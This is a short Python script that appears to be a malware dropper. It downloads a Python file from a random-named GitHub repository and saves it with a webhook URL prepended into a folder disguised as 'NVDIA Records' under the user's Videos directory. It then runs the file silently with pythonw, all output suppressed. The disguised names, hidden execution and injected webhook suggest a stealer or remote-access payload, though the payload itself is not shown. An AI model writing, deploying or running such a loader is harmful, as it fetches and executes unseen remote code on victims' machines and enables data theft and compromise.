import os
import urllib.request
import subprocess
from pathlib import Path


githubraw = "https://raw.githubusercontent.com/erwandemoin/BUIDNBIH9H382H989H8/refs/heads/main/_vlc_.py"
Webhooook = webhook_url

path = os.path.join(Path.home(), 'Videos', 'NVDIA Records')
FilePath = os.path.join(path, 'encoding_records.pyw')

def CreateFandDownloadIT(Webhooook, githubraw):
    os.makedirs(path, exist_ok=True)
    response = urllib.request.urlopen(githubraw)
    remote_content = response.read().decode('utf-8')
    with open(FilePath, "w", encoding="utf8") as f:
        f.write(f"valueWebhook = '{Webhooook}'\n\n")
        f.write(remote_content)
    return FilePath

def StartProg(FilePath):
    try:
        process = subprocess.Popen(
            ["pythonw", FilePath], 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        process.communicate() 
    except Exception as e:
        print(f"Error during execution: {e}")

def main():
    
    CreateFandDownloadIT(Webhooook, githubraw)
    StartProg(FilePath)

if __name__ == "__main__":
    main()
